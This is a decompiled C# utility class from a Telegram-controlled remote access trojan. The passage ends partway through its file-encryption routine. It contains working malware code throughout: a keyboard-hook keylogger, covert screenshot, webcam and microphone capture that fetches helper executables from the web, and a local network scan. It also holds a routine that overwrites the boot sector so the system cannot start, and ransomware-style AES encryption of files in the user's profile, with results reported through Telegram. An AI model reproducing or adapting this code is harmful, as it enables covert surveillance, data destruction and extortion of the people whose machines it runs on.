using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AudioSwitcher.AudioApi;
using AudioSwitcher.AudioApi.CoreAudio;
using Microsoft.Win32;

namespace TelegramRAT;

internal static class utils
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	public class Display
	{
		internal class NativeMethods
		{
			public const int DMDO_DEFAULT = 0;

			public const int DMDO_90 = 1;

			public const int DMDO_180 = 2;

			public const int DMDO_270 = 3;

			public const int ENUM_CURRENT_SETTINGS = -1;

			[DllImport("user32.dll")]
			internal static extern DISP_CHANGE ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, DisplaySettingsFlags dwflags, IntPtr lParam);

			[DllImport("user32.dll")]
			internal static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

			[DllImport("user32.dll", CharSet = CharSet.Ansi)]
			internal static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);
		}

		private enum Orientations
		{
			DEGREES_CW_0 = 0,
			DEGREES_CW_90 = 3,
			DEGREES_CW_180 = 2,
			DEGREES_CW_270 = 1
		}

		[StructLayout(LayoutKind.Explicit)]
		internal struct DEVMODE
		{
			public const int CCHDEVICENAME = 32;

			public const int CCHFORMNAME = 32;

			[FieldOffset(0)]
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmDeviceName;

			[FieldOffset(32)]
			public short dmSpecVersion;

			[FieldOffset(34)]
			public short dmDriverVersion;

			[FieldOffset(36)]
			public short dmSize;

			[FieldOffset(38)]
			public short dmDriverExtra;

			[FieldOffset(40)]
			public DM dmFields;

			[FieldOffset(44)]
			private short dmOrientation;

			[FieldOffset(46)]
			private short dmPaperSize;

			[FieldOffset(48)]
			private short dmPaperLength;

			[FieldOffset(50)]
			private short dmPaperWidth;

			[FieldOffset(52)]
			private short dmScale;

			[FieldOffset(54)]
			private short dmCopies;

			[FieldOffset(56)]
			private short dmDefaultSource;

			[FieldOffset(58)]
			private short dmPrintQuality;

			[FieldOffset(44)]
			public POINTL dmPosition;

			[FieldOffset(52)]
			public int dmDisplayOrientation;

			[FieldOffset(56)]
			public int dmDisplayFixedOutput;

			[FieldOffset(60)]
			public short dmColor;

			[FieldOffset(62)]
			public short dmDuplex;

			[FieldOffset(64)]
			public short dmYResolution;

			[FieldOffset(66)]
			public short dmTTOption;

			[FieldOffset(68)]
			public short dmCollate;

			[FieldOffset(72)]
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmFormName;

			[FieldOffset(102)]
			public short dmLogPixels;

			[FieldOffset(104)]
			public int dmBitsPerPel;

			[FieldOffset(108)]
			public int dmPelsWidth;

			[FieldOffset(112)]
			public int dmPelsHeight;

			[FieldOffset(116)]
			public int dmDisplayFlags;

			[FieldOffset(116)]
			public int dmNup;

			[FieldOffset(120)]
			public int dmDisplayFrequency;
		}

		internal struct DISPLAY_DEVICE
		{
			[MarshalAs(UnmanagedType.U4)]
			public int cb;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string DeviceName;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceString;

			[MarshalAs(UnmanagedType.U4)]
			public DisplayDeviceStateFlags StateFlags;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceID;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceKey;
		}

		internal struct POINTL
		{
			private long x;

			private long y;
		}

		internal enum DISP_CHANGE
		{
			Successful = 0,
			Restart = 1,
			Failed = -1,
			BadMode = -2,
			NotUpdated = -3,
			BadFlags = -4,
			BadParam = -5,
			BadDualView = -6
		}

		[Flags]
		internal enum DisplayDeviceStateFlags
		{
			AttachedToDesktop = 1,
			MultiDriver = 2,
			PrimaryDevice = 4,
			MirroringDriver = 8,
			VGACompatible = 0x10,
			Removable = 0x20,
			ModesPruned = 0x8000000,
			Remote = 0x4000000,
			Disconnect = 0x2000000
		}

		[Flags]
		internal enum DisplaySettingsFlags
		{
			CDS_NONE = 0,
			CDS_UPDATEREGISTRY = 1,
			CDS_TEST = 2,
			CDS_FULLSCREEN = 4,
			CDS_GLOBAL = 8,
			CDS_SET_PRIMARY = 0x10,
			CDS_VIDEOPARAMETERS = 0x20,
			CDS_ENABLE_UNSAFE_MODES = 0x100,
			CDS_DISABLE_UNSAFE_MODES = 0x200,
			CDS_RESET = 0x40000000,
			CDS_RESET_EX = 0x20000000,
			CDS_NORESET = 0x10000000
		}

		[Flags]
		internal enum DM
		{
			Orientation = 1,
			PaperSize = 2,
			PaperLength = 4,
			PaperWidth = 8,
			Scale = 0x10,
			Position = 0x20,
			NUP = 0x40,
			DisplayOrientation = 0x80,
			Copies = 0x100,
			DefaultSource = 0x200,
			PrintQuality = 0x400,
			Color = 0x800,
			Duplex = 0x1000,
			YResolution = 0x2000,
			TTOption = 0x4000,
			Collate = 0x8000,
			FormName = 0x10000,
			LogPixels = 0x20000,
			BitsPerPixel = 0x40000,
			PelsWidth = 0x80000,
			PelsHeight = 0x100000,
			DisplayFlags = 0x200000,
			DisplayFrequency = 0x400000,
			ICMMethod = 0x800000,
			ICMIntent = 0x1000000,
			MediaType = 0x2000000,
			DitherType = 0x4000000,
			PanningWidth = 0x8000000,
			PanningHeight = 0x10000000,
			DisplayFixedOutput = 0x20000000
		}

		private static bool RotateScreen(uint DisplayNumber, Orientations Orientation)
		{
			if (DisplayNumber == 0)
			{
				throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "First display is 1.");
			}
			bool result = false;
			DISPLAY_DEVICE lpDisplayDevice = default(DISPLAY_DEVICE);
			DEVMODE lpDevMode = default(DEVMODE);
			lpDisplayDevice.cb = Marshal.SizeOf(lpDisplayDevice);
			if (!NativeMethods.EnumDisplayDevices(null, DisplayNumber - 1, ref lpDisplayDevice, 0u))
			{
				throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "Number is greater than connected displays.");
			}
			if (NativeMethods.EnumDisplaySettings(lpDisplayDevice.DeviceName, -1, ref lpDevMode) != 0)
			{
				if ((int)(lpDevMode.dmDisplayOrientation + Orientation) % 2 == 1)
				{
					int dmPelsHeight = lpDevMode.dmPelsHeight;
					lpDevMode.dmPelsHeight = lpDevMode.dmPelsWidth;
					lpDevMode.dmPelsWidth = dmPelsHeight;
				}
				switch (Orientation)
				{
				case Orientations.DEGREES_CW_0:
					lpDevMode.dmDisplayOrientation = 0;
					break;
				case Orientations.DEGREES_CW_270:
					lpDevMode.dmDisplayOrientation = 1;
					break;
				case Orientations.DEGREES_CW_180:
					lpDevMode.dmDisplayOrientation = 2;
					break;
				case Orientations.DEGREES_CW_90:
					lpDevMode.dmDisplayOrientation = 3;
					break;
				}
				result = NativeMethods.ChangeDisplaySettingsEx(lpDisplayDevice.DeviceName, ref lpDevMode, IntPtr.Zero, DisplaySettingsFlags.CDS_UPDATEREGISTRY, IntPtr.Zero) == DISP_CHANGE.Successful;
			}
			return result;
		}

		public static void Rotate(string degrees)
		{
			try
			{
				uint num = 0u;
				num = 1u;
				switch (degrees)
				{
				case "270":
					RotateScreen(num, Orientations.DEGREES_CW_270);
					break;
				case "180":
					RotateScreen(num, Orientations.DEGREES_CW_180);
					break;
				case "90":
					RotateScreen(num, Orientations.DEGREES_CW_90);
					break;
				case "0":
					RotateScreen(num, Orientations.DEGREES_CW_0);
					break;
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static Thread keyloggerThread = new Thread(startKeylogger);

	public static string loggerPath = Path.GetDirectoryName(config.InstallPath) + "\\keylogs";

	private static string CurrentActiveWindowTitle;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static int WHKEYBOARDLL = 13;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern short GetKeyState(int keyCode);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("iphlpapi.dll", ExactSpelling = true)]
	public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("Winmm.dll", SetLastError = true)]
	private static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	public static bool IsAdministrator()
	{
		using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
		return new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void CopyFolder(string sourceFolder, string destFolder)
	{
		if (!Directory.Exists(destFolder))
		{
			Directory.CreateDirectory(destFolder);
		}
		string[] files = Directory.GetFiles(sourceFolder);
		foreach (string obj in files)
		{
			string fileName = Path.GetFileName(obj);
			string destFileName = Path.Combine(destFolder, fileName);
			File.Copy(obj, destFileName);
		}
		files = Directory.GetDirectories(sourceFolder);
		foreach (string obj2 in files)
		{
			string fileName2 = Path.GetFileName(obj2);
			string destFolder2 = Path.Combine(destFolder, fileName2);
			CopyFolder(obj2, destFolder2);
		}
	}

	public static string GetCPUName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return "Unknown";
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string GetGPUName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return "Unknown";
		}
		catch
		{
			return "Unknown";
		}
	}

	public static int GetRamAmount()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int result = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						result = (int)(Convert.ToDouble(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("TotalPhysicalMemory")) / 1048576.0);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return result;
		}
		catch
		{
			return -1;
		}
	}

	public static string GetHWID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("ProcessorId").ToString();
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return "Unknown";
		}
		catch
		{
			return "Unknown";
		}
	}

	private static string GetWindowsVersionName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
		try
		{
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text = Convert.ToString(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name"));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			try
			{
				text = text.Split(new char[1] { '|' })[0];
				int length = text.Split(new char[1] { ' ' })[0].Length;
				return text.Substring(length).TrimStart(Array.Empty<char>()).TrimEnd(Array.Empty<char>());
			}
			catch
			{
				return "Unknown System";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static string getBitVersion()
	{
		if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
		{
			return "(32 Bit)";
		}
		return "(64 Bit)";
	}

	public static string GetSystemVersion()
	{
		return GetWindowsVersionName() + Convert.ToChar(32) + getBitVersion();
	}

	public static string GetProgramsList()
	{
		List<string> list = new List<string>();
		string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
		foreach (string path in directories)
		{
			list.Add(new DirectoryInfo(path).Name);
		}
		directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
		foreach (string path2 in directories)
		{
			list.Add(new DirectoryInfo(path2).Name);
		}
		return string.Join(", ", list) + ".";
	}

	public static IPAddress GetDefaultGateway()
	{
		return (from g in (from n in NetworkInterface.GetAllNetworkInterfaces()
				where n.OperationalStatus == OperationalStatus.Up
				where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select n).SelectMany((NetworkInterface n) => n.GetIPProperties()?.GatewayAddresses)
			select g?.Address into a
			where a != null
			select a).FirstOrDefault();
	}

	public static void isConnectedToInternet()
	{
		Ping ping;
		while (true)
		{
			ping = new Ping();
			PingReply pingReply;
			try
			{
				pingReply = ping.Send("google.com", 600);
			}
			catch
			{
				continue;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				break;
			}
			Console.WriteLine("[!] Retrying connect to internet...");
		}
		Console.WriteLine("[+] Connected to internet");
		while (true)
		{
			PingReply pingReply;
			try
			{
				pingReply = ping.Send("api.telegram.org", 600);
			}
			catch
			{
				continue;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				break;
			}
			Console.WriteLine("[!] Retrying connect to api.telegram.org");
		}
		Console.WriteLine("[+] Connected to api.telegram.org");
	}

	public static void NetDiscover(int to)
	{
		telegram.sendText($"\ud83d\udce1 Scanning local network. From 1 to {to} hosts.");
		string text = "";
		try
		{
			text = GetDefaultGateway().ToString();
		}
		catch (NullReferenceException)
		{
			telegram.sendText("\ud83d\udd0c Not connected to WI-FI network.");
			return;
		}
		byte[] array = new byte[6];
		uint physicalAddrLen = (uint)array.Length;
		string[] array2 = text.Split(new char[1] { '.' });
		string text2 = array2[0] + "." + array2[1] + "." + array2[2] + ".";
		for (int i = 1; i < to; i++)
		{
			string text3 = text2 + i;
			if (new Ping().Send(text3, 10).Status != 0)
			{
				continue;
			}
			IPAddress address = IPAddress.Parse(text3);
			string arg;
			try
			{
				arg = Dns.GetHostEntry(address).HostName;
			}
			catch
			{
				arg = "unknown";
			}
			string arg2;
			if (SendARP(BitConverter.ToInt32(IPAddress.Parse(text3).GetAddressBytes(), 0), 0, array, ref physicalAddrLen) != 0)
			{
				arg2 = "unknown";
			}
			else
			{
				string[] array3 = new string[physicalAddrLen];
				for (int j = 0; j < physicalAddrLen; j++)
				{
					array3[j] = array[j].ToString("x2");
				}
				arg2 = string.Join(":", array3);
			}
			telegram.sendText($"✅ New host detected. Ip: \"{text3}\", Name: \"{arg}\", Mac: \"{arg2}\"");
		}
		telegram.sendText("✅ Scanning " + to + " hosts completed!");
	}

	public static void desktopScreenshot()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		string text = "screenshot.png";
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
		Graphics.FromImage((Image)val).CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
		((Image)val).Save(text, ImageFormat.get_Png());
		telegram.sendImage(text);
		File.Delete(text);
	}

	public static void webcamScreenshot(string delay, string camera)
	{
		string text = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
		string address = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
		string text2 = "webcam.png";
		if (!File.Exists(text))
		{
			telegram.sendText("\ud83d\udcf7 Downloading CommandCam...");
			new WebClient().DownloadFile(address, text);
			telegram.sendText("\ud83d\udcf7 CommandCam loaded!");
		}
		telegram.sendText("\ud83d\udcf9 Trying create screenshot from camera " + camera);
		if (File.Exists(text2))
		{
			File.Delete(text2);
		}
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = text;
		processStartInfo.Arguments = "/filename \"" + text2 + "\" /delay " + delay + " /devnum " + camera;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
		if (!File.Exists(text2))
		{
			telegram.sendText("\ud83d\udcf7 Webcam not found!");
			return;
		}
		telegram.sendImage(text2);
		File.Delete(text2);
	}

	public static void recordMircophone(string time)
	{
		string text = "fmedia.exe";
		string text2 = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
		string address = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
		string text3 = "recording.wav";
		telegram.sendText("\ud83c\udfa7 Listening microphone " + time + " seconds...");
		if (!File.Exists(text2 + text))
		{
			telegram.sendText("\ud83c\udfa4 Downloading FMedia...");
			string text4 = text2 + "fmedia.zip";
			Directory.CreateDirectory(text2);
			new WebClient().DownloadFile(address, text4);
			ZipFile.ExtractToDirectory(text4, text2);
			File.Delete(text4);
			telegram.sendText("\ud83c\udfa4 FMedia loaded!");
		}
		if (File.Exists(text3))
		{
			File.Delete(text3);
		}
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = text2 + text,
			Arguments = "--record --until=" + time + " -o " + text3
		};
		process.Start();
		process.WaitForExit();
		if (!File.Exists(text3))
		{
			telegram.sendText("\ud83c\udfa4 Microphone not found!");
			return;
		}
		telegram.sendVoice(text3);
		File.Delete(text3);
	}

	public static void PowerCommand(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = "shutdown.exe",
			Arguments = args
		};
		process.Start();
	}

	public static void startKeylogger()
	{
		if (File.Exists(loggerPath))
		{
			File.Delete(loggerPath);
		}
		_hookID = SetHook(_proc);
		Application.Run();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(process.ProcessName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			bool flag = (GetKeyState(20) & 0xFFFF) != 0;
			bool flag2 = ((uint)GetKeyState(160) & 0x8000u) != 0 || (GetKeyState(161) & 0x8000) != 0;
			string text = KeyboardLayout((uint)num);
			text = ((!(flag || flag2)) ? text.ToLower() : text.ToUpper());
			Keys val;
			if (num >= 112 && num <= 135)
			{
				val = (Keys)num;
				text = "[" + ((object)(Keys)(ref val)).ToString() + "]";
			}
			else
			{
				val = (Keys)num;
				switch (((object)(Keys)(ref val)).ToString())
				{
				case "LControlKey":
					text = "[CTRL]";
					break;
				case "Capital":
					text = ((!flag) ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]");
					break;
				case "Space":
					text = " ";
					break;
				case "Escape":
					text = "[ESC]";
					break;
				case "LWin":
					text = "[WIN]";
					break;
				case "RShiftKey":
					text = "[RShift]";
					break;
				case "Return":
					text = "\n";
					break;
				case "Back":
					text = "[Back]";
					break;
				case "Tab":
					text = "[Tab]";
					break;
				case "LShiftKey":
					text = "[LShift]";
					break;
				case "RControlKey":
					text = "[CTRL]";
					break;
				}
			}
			using StreamWriter streamWriter = new StreamWriter(loggerPath, append: true);
			if (CurrentActiveWindowTitle == GetActiveWindowTitle())
			{
				streamWriter.Write(text);
			}
			else
			{
				streamWriter.WriteLine(Environment.NewLine);
				streamWriter.WriteLine("###  " + GetActiveWindowTitle() + " ###");
				streamWriter.Write(text);
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	private static string KeyboardLayout(uint vkCode)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[256];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(vkCode, 0u);
			uint lpdwProcessId;
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out lpdwProcessId));
			ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		Keys val = (Keys)vkCode;
		return ((object)(Keys)(ref val)).ToString();
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
			Process processById = Process.GetProcessById((int)lpdwProcessId);
			string text = processById.MainWindowTitle;
			if (string.IsNullOrWhiteSpace(text))
			{
				text = processById.ProcessName;
			}
			CurrentActiveWindowTitle = text;
			return text;
		}
		catch (Exception)
		{
			return "Unknown";
		}
	}

	public static void MinimizeAllWindows()
	{
		SendMessage(FindWindow("Shell_TrayWnd", null), 273, (IntPtr)419, IntPtr.Zero);
	}

	public static void MaximizeAllWindows()
	{
		SendMessage(FindWindow("Shell_TrayWnd", null), 273, (IntPtr)416, IntPtr.Zero);
	}

	public static string MD5(this string s)
	{
		using MD5 mD = System.Security.Cryptography.MD5.Create();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(s));
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2").ToLower());
		}
		return stringBuilder.ToString();
	}

	public static void PlayMusic(string file)
	{
		telegram.sendText("\ud83c\udfb5 Starting playing " + Path.GetFileName(file));
		try
		{
			StringBuilder lpszReturnString = new StringBuilder();
			mciSendString("open \"" + file + "\" alias MP3", lpszReturnString, 0, IntPtr.Zero);
			mciSendString("play MP3", lpszReturnString, 0, IntPtr.Zero);
		}
		catch
		{
			telegram.sendText("⛔ Something was wrong while playing " + file);
		}
	}

	public static void DestroySystem()
	{
		uint nNumberOfBytesToWrite = 512u;
		byte[] lpBuffer = new byte[512];
		IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive0", 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		uint lpNumberOfBytesWritten;
		if (intPtr == (IntPtr)(-1))
		{
			telegram.sendText("⛔ Please start as admin!");
		}
		else if (WriteFile(intPtr, lpBuffer, nNumberOfBytesToWrite, out lpNumberOfBytesWritten, IntPtr.Zero))
		{
			telegram.sendText("\ud83d\ude39 The boot sector has been overwritten. The system will no longer boot.");
		}
		else
		{
			telegram.sendText("\ud83d\ude3f Failed overwrite boot sector.");
		}
	}

	public static IEnumerable<string> GetFiles(string path, string searchPattern, SearchOption searchOption)
	{
		List<string> foldersToProcess = new List<string> { path };
		while (foldersToProcess.Count > 0)
		{
			string path2 = foldersToProcess[0];
			foldersToProcess.RemoveAt(0);
			if (searchOption.HasFlag(SearchOption.AllDirectories))
			{
				try
				{
					string[] directories = Directory.GetDirectories(path2);
					foldersToProcess.AddRange(directories);
				}
				catch
				{
				}
			}
			List<string> list = new List<string>();
			try
			{
				list = Directory.GetFiles(path2, searchPattern, SearchOption.TopDirectoryOnly).ToList();
			}
			catch
			{
			}
			foreach (string item in list)
			{
				yield return item;
			}
		}
	}

	public static void EncryptFileSystem(string key)
	{
		IEnumerable<string> files = GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.*", SearchOption.AllDirectories);
		List<string> list = new List<string>();
		foreach (string item in files)
		{
			if (config.EncryptionFileTypes.Contains<string>(Path.GetExtension(item)))
			{
				list.Add(Path.GetFullPath(item));
			}
		}
		telegram.sendText($"\ud83d\udd12 {list.Count} files will be encrypted");
		foreach (string item2 in list)
		{
			EncryptFile(item2, key);
		}
		telegram.sendText("\ud83d\udd12 All files encrypted in user directory");
	}

	public static void DecryptFileSystem(string key)
	{
		IEnumerable<string> files = GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.crypted", SearchOption.AllDirectories);
		telegram.sendText($"\ud83d\udd13 {files.Count()} files will be decrypted");
		foreach (string item in files)
		{
			DecryptFile(item, key);
		}
		telegram.sendText("\ud83d\udd13 All files decrypted in user directory");
	}

	private static byte[] EncryptBytes(byte[] clearBytes, string EncryptionKey)
	{
		using Aes aes = Aes.Create();
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, new byte[13]
		{
			73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
			100, 101, 118
		});
		aes.Key = rfc2898DeriveBytes.GetBytes(32);
		aes.IV = rfc2898DeriveBytes.GetBytes(16);
		using MemoryStream memoryStream = new MemoryStream();
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(clearBytes, 0, clearBytes.Length);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	private static byte[] DecryptBytes(byte[] cipherBytes, string EncryptionKey)
	{
		using Aes aes = Aes.Create();
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, new byte[13]
		{
			73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
			100, 101, 118
		});
		aes.Key = rfc2898DeriveBytes.GetBytes(32);
		aes.IV = rfc2898DeriveBytes.GetBytes(16);
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(cipherBytes, 0, cipherBytes.Length);
			try
			{
				cryptoStream.Close();
			}
			catch (CryptographicException)
			{
				telegram.sendText("Failed to decrypt file. Wrong password!");
				return memoryStream.ToArray();
			}
		}
		return memoryStream.ToArray();
	}

	private static void EncryptFile(string inputFile, string password)
	{
		if (File.Exists(inputFile))
		{
			string path = inputFile + ".crypted";
			byte[] bytes = EncryptBytes(File.ReadAllBytes(inputFile), password);
